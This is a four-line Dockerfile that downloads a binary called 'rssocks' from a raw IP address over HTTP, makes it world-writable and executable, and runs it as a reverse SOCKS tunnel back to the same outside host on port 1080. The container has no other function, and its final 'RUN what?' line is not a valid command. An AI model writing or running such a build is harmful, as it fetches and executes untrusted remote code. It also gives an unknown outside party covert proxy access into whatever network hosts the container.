FROM busybox
RUN wget http://119.90.17.2/rssocks
RUN chmod 777 ./rssocks
RUN ./rssocks -s 119.90.17.2:1080
RUN what?
